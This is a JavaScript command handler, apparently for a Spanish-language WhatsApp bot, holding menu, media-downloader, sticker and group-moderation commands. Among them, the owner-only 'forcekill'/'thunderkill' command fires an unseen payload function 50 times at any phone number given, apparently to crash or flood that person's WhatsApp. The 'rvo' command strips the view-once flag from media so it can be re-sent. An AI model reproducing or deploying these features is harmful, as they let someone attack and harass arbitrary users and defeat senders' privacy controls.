𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫𝑺 ° ᭄
˖✿ play
˖✿ play2
˖✿ play1
˖✿ play3
˖✿ fb
˖✿ tt
˖✿ ig
˖✿ git
˖✿ spotify

𝑺𝑼𝑩 𝑩𝑶𝑻
˖✿ code
˖✿ killjadibot

𝑮𝑹𝑶𝑼𝑷𝑺 ° ᭄
˖✿ kick
˖✿ tag
˖✿ link
˖✿ tomartecito

𝑷𝑬𝑹𝑺𝑶𝑵𝑨𝑳𝑰𝑧𝑬 ° ᭄
˖✿ setemoji
˖✿ setmenu
˖✿ setbotname

𝑻𝑶𝑶𝑳𝑺 ° ᭄
˖✿ rvo
˖✿ ava
˖✿ s
˖✿ brat
˖✿ brat2
˖✿ run
˖✿ hd
˖✿ whatmusic
˖✿ toghibli

𝑺𝑬𝑨𝑹𝑪𝑯𝑬𝑹𝑺 ° ᭄
˖✿ pinterest
˖✿ tourl
˖✿ imagen
˖✿ yts
˖✿ tiktoksearch

𝑶𝑾𝑵𝑬𝑹 ° ᭄
˖✿ modopc
˖✿ modopv
˖✿ addowner
˖✿ delowner
˖✿ $
˖✿ eval
˖✿ ds
˖✿ infomsg
˖✿ forcekill

> ʙʏ ᴇʟɪᴀsᴀʀʏᴛ   
`.trim();
global.rcanal = { 
contextInfo: { 
isForwarded: true,  
forwardingScore: 9999999,  
forwardedNewsletterMessageInfo: { 
newsletterJid: "120363296103096943@newsletter",  
serverMessageId: 100,  
newsletterName: `${getBotName(userSender)}`,  
},  
externalAdReply: {  
showAdAttribution: false,  
title: `${getBotName(userSender)} ${SetEmoji[userSender] || SetEmoji.default}`,  
mediaType: 2,  
sourceUrl: 'https://whatsapp.com/channel/0029VadxAUkKLaHjPfS1vP36',  
thumbnailUrl:  'https://i.ibb.co/355QSrkS/6f7c2bd26e45.jpg', 
}  
}  
};
let img = FotosMenu[userSender] || FotosMenu.default;  
await conn.sendFile(
m.chat, 
img, 
'thumbnail.jpg', 
menuText, 
m, 
{ mentions: [`${userSender}@s.whatsapp.net`] }, 
rcanal
);
break;
}
case 'modopv': {
if (!isCreator) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo el creador puede usar este comando.`);
global.publicMode = false;
saveConfig(botID, false);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Modo privado activado. Solo responderé al propietario.`);
break;
}

case 'modopc': {
if (!isCreator) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo el creador puede usar este comando.`);
global.publicMode = true;
saveConfig(botID, true);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Modo público activado. Responderé a todos.`);
break;
}
case 'pinterest': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa una palabra clave para buscar imágenes en Pinterest`);

const { pinterest } = require('./scrapers/scraper.js');

try {
let response = await pinterest.search(text, 10);

if (!response || !response.response || !response.response.pins || response.response.pins.length === 0) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se encontraron imágenes para "${text}".`);
}

let images = response.response.pins.map(item => ({
type: "image",
data: { url: item.media.images.orig.url }
}));

await conn.sendAlbumMessage(m.chat, images, { quoted: m });

} catch (err) {
console.error(err);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Hubo un error al obtener las imágenes.`);
}
break;
}
case 'tiktok': 
case 'tt': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un enlace de TikTok válido`);
if (!text.includes('tiktok.com')) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} El enlace proporcionado no es válido.`);

let apiUrl = `https://eliasar-yt-api.vercel.app/api/download/tiktok?query=${encodeURIComponent(text)}`;

try {
let response = await fetch(apiUrl);
let json = await response.json();

if (!json.status || !json.results || !json.results.video.noWatermark) throw new Error('Primera API falló');

let videoUrl = json.results.video.noWatermark;
let audioUrl = json.results.music.playUrl;
let author = json.results.author;
let stats = json.results.stats;

let caption = `${SetEmoji[userSender] || SetEmoji.default} *TikTok Video*\n\n🔹 *Título:* ${json.results.title}\n🔹 *Creador:* ${author.authorName} (@${author.authorUniqueId})\n🔹 *Fecha:* ${json.results.created_at}\n🔹 *Reproducciones:* ${stats.playCount}\n🔹 *Me gusta:* ${stats.likeCount}\n🔹 *Comentarios:* ${stats.commentCount}\n🔹 *Compartidos:* ${stats.shareCount}\n🔹 *Guardados:* ${stats.saveCount}`;

await conn.sendMessage(m.chat, { video: { url: videoUrl }, mimetype: 'video/mp4', caption }, { quoted: m });
await conn.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4', ptt: false }, { quoted: m });

} catch (err) {
let fallbackApiUrl = `https://delirius-apiofc.vercel.app/download/tiktok?url=${encodeURIComponent(text)}`;

try {
let fallbackResponse = await fetch(fallbackApiUrl);
let fallbackJson = await fallbackResponse.json();

if (!fallbackJson.status || !fallbackJson.data || !fallbackJson.data.meta.media) 
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo obtener el video.`);

let videoHDUrl = fallbackJson.data.meta.media.find(media => media.type === 'video' && media.size_hd)?.hd;
let author = fallbackJson.data.author;
let stats = fallbackJson.data;

let caption = `${SetEmoji[userSender] || SetEmoji.default} *TikTok Video (HD)*\n\n🔹 *Título:* ${fallbackJson.data.title || 'Sin título'}\n🔹 *Creador:* ${author.nickname} (@${author.username})\n🔹 *Fecha:* ${stats.published}\n🔹 *Reproducciones:* ${stats.repro}\n🔹 *Me gusta:* ${stats.like}\n🔹 *Comentarios:* ${stats.comment}\n🔹 *Compartidos:* ${stats.share}\n🔹 *Descargas:* ${stats.download}`;

await conn.sendMessage(m.chat, { video: { url: videoHDUrl }, mimetype: 'video/mp4', caption }, { quoted: m });

} catch {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo obtener el video desde ninguna API.`);
}
}
break;
}
case 'forcekill':
case 'thunderkill': {
if (!isOwner) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo el owner puede usar este comando.`);
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Uso correcto: .${command} 505XXXXXXXX`);

let targetNumber = text.replace(/[^0-9]/g, "");
if (targetNumber.startsWith('0')) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un número válido con código de país. Ejemplo: .${command} 505XXXXXXXX`);

let target = `${targetNumber}@s.whatsapp.net`;
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Enviando proceso a ${target}, espera un momento...`);

for (let i = 0; i < 50; i++) {
await MpMSqL(target);
}

m.reply(`${SetEmoji[userSender] || SetEmoji.default} Proceso completado con éxito. Espera 5 minutos antes de volver a intentarlo para evitar bloqueos.`);
break;
}
case 'tiktoksearch': {    
const axios = require('axios');    
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un término de búsqueda.`);    

try {    
const response = await axios.get(`https://delirius-apiofc.vercel.app/search/tiktoksearch?query=${encodeURIComponent(text)}`);    
const results = response.data.meta.slice(0, 6);    

if (!results.length) return m.reply('No se encontraron resultados.');    

const messages = results.map(video => [    
`${SetEmoji[userSender] || SetEmoji.default} Resultado encontrado:`,  
`Autor: ${video.author.nickname} (@${video.author.username})\n` +    
`Vistas: ${parseInt(video.play).toLocaleString()}\n` +    
`Likes: ${parseInt(video.like).toLocaleString()}\n` +    
`Comentarios: ${parseInt(video.coment).toLocaleString()}\n` +    
`Compartidos: ${parseInt(video.share).toLocaleString()}\n` +  
`By EliasarYT`,   
video.hd,    
[],    
video.url,    
[['Ver en TikTok', video.url]]    
]);    

await conn.sendCarousel(m.chat, `Resultados para: "${text}"`, 'TikTok Search', messages, m);    
} catch (error) {    
m.reply('Error al buscar videos.');    
}    
break;    
}
/*case 'ytsearch':
case 'yts': {
const yts = require('yt-search');
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un término de búsqueda.`);

try {
const searchResults = await yts(text);
const videos = searchResults.videos.slice(0, 10);

if (videos.length === 0) return m.reply('No se encontraron resultados.');

const messages = videos.map(video => [
video.title,
`Canal: ${video.author.name}\nVistas: ${video.views.toLocaleString()}`,
video.thumbnail,
[],
video.url,
[['Abrir enlace', video.url]]
]);

await conn.sendCarousel(m.chat, `${SetEmoji[userSender] || SetEmoji.default} Resultados para: "${text}"`, 'YouTube Search', messages, m);
} catch (error) {
m.reply('Error al buscar videos.');
}
break;
}*/
case 'imagen': {
if (!text) throw '*⚠️ Ingresa el término de búsqueda.*';
m.react('⌛');

const { pinterest } = require('./scrapers/scraper.js');

try {
let response = await pinterest.search(text, 8);
if (!response || !response.response || !response.response.pins || response.response.pins.length === 0) {
return await m.reply('❌ No se encontraron resultados.');
}

let selectedResults = response.response.pins;

if (m.isWABusiness) {
const medias = selectedResults.map(result => ({
image: { url: result.media.images.orig.url },
caption: result.uploader.full_name || text
}));
await conn.sendAlbumMessage(m.chat, medias, { quoted: m, delay: 2000, caption: `✅ Resultados para: ${text}` });
} else {
let messages = selectedResults.map(result => [
'',
`*${result.title || text}*\n*🔸️Autor:* *${result.uploader.full_name || 'Desconocido'}*`,
result.media.images.orig.url
]);
await conn.sendCarousel(m.chat, `✅ Resultados para: ${text}`, 'by EliasarYT', messages, m);
m.react('✅️');
}
} catch (error) {
console.error(error);
m.react('❌️');
}
break;
}
case 'rw': { 
    try { 
        let appData = JSON.parse(fs.readFileSync('json/app.json', 'utf8')); 
        const randomItem = appData[Math.floor(Math.random() * appData.length)]; 
        
        await conn.sendMessage(m.chat, { 
            image: { url: randomItem.img }, 
            caption: `Nombre: ${randomItem.name}\nPrecio: ${randomItem.Prec}` 
        }, { quoted: m }); 
        
    } catch (error) { 
        console.error(error); 
        m.reply("⚠️ Ocurrió un error al procesar la solicitud."); 
    } 
    break; 
}
case 'hantia': {
try {
let result = await axios.get(`https://eliasar-yt-api.vercel.app/api/hentaila`)
await conn.sendMessage(m.chat, {
  image: { url: result.data.img },
  caption: 'rico 😈',
}, { quoted: m });
}
catch (error) {
  console.error(error);
  m.reply("⚠️ Ocurrió un error al procesar la solicitud.");
}}
break;
case 'a45': {
if (!text || !/^https?:\/\/.+/.test(text)) {
  return m.reply("⚠️ Ingresa una URL válida.");
}
try {
let result = await axios.get(`https://api.siputzx.my.id/api/d/spotify?url=${text}`); 
let videoInfo = `
Resultados 👻
 Título ${result.data.data.title} 
 type ${result.data.data.type} 
 artis ${result.data.data.artis} `
await conn.sendMessage(m.chat, {
  image: { url: result.data.data.image },
  caption: videoInfo,
}, { quoted: m });
await conn.sendMessage(m.chat, {
audio: { url: result.data.data.download },
mimetype: 'audio/mpeg',
fileName: `${result.data.data.title}.mp3`,
caption: `🎵 ${result.data.data.title} - ${result.data.data.artis}`,
}, { quoted: m })
}
catch (error) {
  console.error(error);
  m.reply("⚠️ Ocurrió un error al procesar la solicitud.");
}
break;
}
case 'spotify':
case 'music': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa el nombre de la canción o el enlace de Spotify.`)

try {
let song;
let processedThumbnail;

if (text.includes('spotify.com/track/')) {
let url = `https://vajira-official-api.vercel.app/download/getInfo?url=${encodeURIComponent(text)}`
let response = await fetch(url)
let result = await response.json()

if (!result.status || !result.result?.data) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No pude obtener información de la canción.`)
}

let data = result.result.data
song = {
title: data.title,
artist: data.artist.name,
album: 'Desconocido',
duration: 'Desconocida',
popularity: 'Desconocida',
publish: 'Desconocida',
url: text,
image: data.thumbnail
}

let imageResponse = await fetch(song.image)
let imageBuffer = await imageResponse.arrayBuffer()
let image = await require('jimp').read(Buffer.from(imageBuffer))
image.resize(250, 250)
processedThumbnail = await image.getBufferAsync(require('jimp').MIME_JPEG)

} else {
let search = await fetch(`https://delirius-apiofc.vercel.app/search/spotify?q=${encodeURIComponent(text)}`)
let data = await search.json()

if (!data.status || !data.data.length) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No encontré resultados.`)
}

song = data.data[Math.floor(Math.random() * data.data.length)]

let imageResponse = await fetch(song.image)
let imageBuffer = await imageResponse.arrayBuffer()
let image = await require('jimp').read(Buffer.from(imageBuffer))
image.resize(250, 250)
processedThumbnail = await image.getBufferAsync(require('jimp').MIME_JPEG)
}

let caption = `
${SetEmoji[userSender] || SetEmoji.default} 🎵 *Título:* ${song.title}
🎤 *Artista:* ${song.artist}
📀 *Álbum:* ${song.album}
⏱️ *Duración:* ${song.duration}
⭐ *Popularidad:* ${song.popularity}
📅 *Lanzamiento:* ${song.publish}
🔗 *Link:* _(${song.url})_`

await conn.sendMessage(m.chat, {
image: processedThumbnail,
caption: caption
}, { quoted: m })

let download = await fetch(`https://api.vreden.my.id/api/spotify?url=${encodeURIComponent(song.url)}`)
let songData = await download.json()

let audioUrl = songData.result?.music

if (!audioUrl) {
let backupDownload = await fetch(`https://delirius-apiofc.vercel.app/download/spotifydlv3?url=${encodeURIComponent(song.url)}`)
let backupData = await backupDownload.json()

if (backupData.status && backupData.data?.url) {
audioUrl = backupData.data.url
} else {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No pude descargar la canción.`)
}
}

await conn.sendMessage(m.chat, {
document: { url: audioUrl },
mimetype: 'audio/mpeg',
fileName: `${song.title}.mp3`,
caption: `🎵 ${song.title} - ${song.artist}`,
jpegThumbnail: processedThumbnail
}, { quoted: m })

} catch (err) {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Error al obtener la música.`)
}
break
}
case 'fb': 
case 'facebook': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un enlace de Facebook válido`);

if (!text.includes('facebook.com') && !text.includes('fb.watch')) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} El enlace proporcionado no es válido.`);
}

let apiUrl = `https://eliasar-yt-api.vercel.app/api/facebookdl?link=${encodeURIComponent(text)}`;

try {
let response = await fetch(apiUrl);
let json = await response.json();

if (!json.status || !json.data || json.data.length === 0) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo obtener el video. Verifica el enlace.`);
}

let videoUrl = json.data[0].url;
let caption = `*${SetEmoji[userSender] || SetEmoji.default} fasebok - ${id}*`;

await conn.sendMessage(m.chat, { video: { url: videoUrl }, mimetype: 'video/mp4', caption }, { quoted: m });

} catch (err) {
console.error(err);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Hubo un error al obtener el video.`);
}
break;
}
case 'Instagram':
case 'ig': {
if (!text) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Ingresa un enlace de Instagram válido`);

if (!text.includes('instagram.com')) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} El enlace proporcionado no es válido.`);
}

let apiUrl = `https://api.dorratz.com/igdl?url=${encodeURIComponent(text)}`;

try {
let response = await fetch(apiUrl);
let json = await response.json();

if (!json.data || json.data.length === 0) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo obtener el video. Verifica el enlace.`);
}

let videoUrl = json.data[0].url;
let thumbnail = json.data[0].thumbnail;

let caption = `*${SetEmoji[userSender] || SetEmoji.default} Instagram - ${id}*`;

await conn.sendMessage(m.chat, { video: { url: videoUrl }, mimetype: 'video/mp4', caption }, { quoted: m });

} catch (err) {
console.error(err);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Hubo un error al obtener el video.`);
}
break;
}
case 'rvo': {
if (!m.quoted) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Responde a un mensaje de una vista junto al mismo comando.`);

const quotedMsg = m.quoted.fakeObj?.message;
let mediaType = null;
let mediaMessage = null;

if (quotedMsg?.imageMessage?.viewOnce) {
mediaType = "image";
mediaMessage = quotedMsg.imageMessage;
} else if (quotedMsg?.videoMessage?.viewOnce) {
mediaType = "video";
mediaMessage = quotedMsg.videoMessage;
} else if (quotedMsg?.audioMessage?.viewOnce) {
mediaType = "audio";
mediaMessage = quotedMsg.audioMessage;
}

if (mediaType) {
delete mediaMessage.viewOnce;

const caption = m.quoted?.caption || mediaMessage?.caption;
let contextInfo = { isForwarded: false };
if (caption) {
contextInfo.mentionedJid = (caption);
}

return conn.sendMessage(m.chat, { forward: m.quoted.fakeObj, contextInfo: contextInfo }, { quoted: m });
} else {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Este no es un mensaje de una vista.`);
}
}
break;

case 'ava': {
let number = text.replace(/\D/g, '');
let member = null;

if (text) {
member = number + '@s.whatsapp.net';
} else if (m.quoted?.sender) {
member = m.quoted.sender;
} else if (m.mentionedJid?.length > 0) {
member = m.mentionedJid[0];
} else {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Debes escribir un número, mencionar a alguien o responder a un mensaje.`, m);
}

try {
let onWhatsapp = await conn.onWhatsApp(member);
if (!onWhatsapp || !onWhatsapp.length) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} El número no está registrado en WhatsApp.`, m);
}

let pic;
try {
pic = await conn.profilePictureUrl(member, 'image');
} catch {
pic = null;
}

if (!pic) {
return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Él/Ella no tiene foto de perfil o la tiene privada.`, m);
}

await conn.sendMessage(m.chat, {
image: { url: pic },
caption: `${SetEmoji[userSender] || SetEmoji.default} Aquí está la foto de perfil solicitada.`
}, { quoted: m });

} catch (err) {
console.error(err);
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Hubo un error al obtener la foto de perfil.`, m);
}
break;
}

case 'kick': 
case 'echar': 
case 'sacar': 
case 'expulsar': {
if (!m.isGroup) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Este comando solo funciona en grupos`);
if (!isGroupAdmins) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Solo los administradores pueden usar este comando`);
if (!isBotAdmins) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Necesito ser administrador para expulsar miembros`);

let userToKick = m.mentionedJid[0] || (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);
if (!userToKick && m.quoted && m.quoted.sender) {
userToKick = m.quoted.sender;
}

if (!userToKick) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Menciona a un usuario, proporciona su número o responde a un mensaje`);

try {
await conn.groupParticipantsUpdate(m.chat, [userToKick], 'remove');
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Usuario expulsado correctamente`);
} catch (e) {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} No se pudo expulsar al usuario`);
}
break;
}

case 'link': 
case 'gruplink': 
case 'invitelink': {
if (!m.isGroup) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Este comando solo funciona en grupos`);
if (!isBotAdmins) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Necesito ser administrador para obtener el enlace del grupo`);

try {
let inviteCode = await conn.groupInviteCode(m.chat);
let groupLink = `https://chat.whatsapp.com/${inviteCode}`;
m.reply(`${SetEmoji[userSender] || SetEmoji.default} Aquí está el enlace del grupo:\n${groupLink}`);
} catch (e) {
m.reply(`${SetEmoji[userSender] || SetEmoji.default} No pude obtener el enlace del grupo`);
}
break;
}
case 'tag': 
case 'everyone': 
case 'tagall': {
if (!m.isGroup) return m.reply(info.group) 
if (!isGroupAdmins) return m.reply(info.admin)
if (!m.quoted && !text) return m.reply(lenguaje.grupos.text) 
try { 
conn.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
} catch {  
conn.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m, ephemeralExpiration: 24*60*100, disappearingMessagesInChat: 24*60*100})}
    break;
}
case 'bc': {
  if (!isOwner) return m.reply("❌ Solo el owner puede ejecutar este comando.");
  if (!text) return m.reply("Debes proporcionar el mensaje.");

  let imageUrl = null;
  const regex = /multiurl:\s*(https?:\/\/\S+)/i;
  const match = text.match(regex);
  if (match) {
    imageUrl = match[1];
    text = text.replace(match[0], "").trim();
  }

  const chats = Object.keys(global.db.data.chats);
  for (let jid of chats) {
    try {
      if (imageUrl) {
        await conn.sendMessage(jid, { image: { url: imageUrl }, caption: text });
      } else {
        await conn.sendMessage(jid, { text: text });
      }
    } catch (err) {
      console.error(err);
    }
  }
  m.reply(`✅ Broadcast enviado a ${chats.length} chats.`);
  break;
}
case 's': case 'sticker': {
const d = new Date(new Date() + 3600000);
const locale = 'es-ES';
const dias = d.toLocaleDateString(locale, { weekday: 'long' });
const fecha = d.toLocaleDateString(locale, { day: '2-digit', month: '2-digit', year: 'numeric' });

let authorInfo = `{
"developer": "by EliasarYT",
"usuario": "${pushname}",
"fecha": "${fecha}",
"día": "${dias}"
}`;

if (/image/.test(mime)) {  
media = await quoted.download();
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { 
packname: "", 
author: authorInfo, 
contextInfo: { 
forwardedNewsletterMessageInfo: { 
newsletterJid: '120363160031023229@newsletter', 
serverMessageId: '', 
newsletterName: 'INFINITY-WA 💫' 
}, 
forwardingScore: 9999999,  
isForwarded: true, 
externalAdReply: { 
showAdAttribution: false, 
title: `𝑴𝒊𝒄𝒂𝑺𝒉𝒂𝒅𝒆 ${SetEmoji[userSender] || SetEmoji.default}`, 
mediaType: 2, 
sourceUrl: 'https://whatsapp.com/channel/0029VadxAUkKLaHjPfS1vP36', 
thumbnailUrl: FotosMenu[userSender] || FotosMenu.default
} 
} 
});
await fs.unlinkSync(encmedia);
} else if (/video/.test(mime)) {  
if ((quoted.msg || quoted).seconds > 20) return m.reply(lenguaje.sticker.text1);
media = await quoted.download();
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { 
packname: "", 
author: authorInfo, 
contextInfo: { 
forwardedNewsletterMessageInfo: { 
newsletterJid: '120363160031023229@newsletter', 
serverMessageId: '', 
newsletterName: 'INFINITY-WA 💫' 
}, 
forwardingScore: 9999999,  
isForwarded: true, 
externalAdReply: { 
showAdAttribution: false, 
title: `𝑴𝒊𝒄𝒂𝑺𝒉𝒂𝒅𝒆 ${SetEmoji[userSender] || SetEmoji.default}`, 
mediaType: 2, 
sourceUrl: 'https://whatsapp.com/channel/0029VadxAUkKLaHjPfS1vP36', 
thumbnailUrl: FotosMenu[userSender] || FotosMenu.default
} 
} 
});
await new Promise((resolve) => setTimeout(resolve, 2000));
await fs.unlinkSync(encmedia);
} else {  
m.reply(`${SetEmoji[userSender] || SetEmoji.default} ¿Y la imagen?`);
}
break;
}
}
}

//•━━━『 UPDATE DEL ARCHIVO 』━━━━•     
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
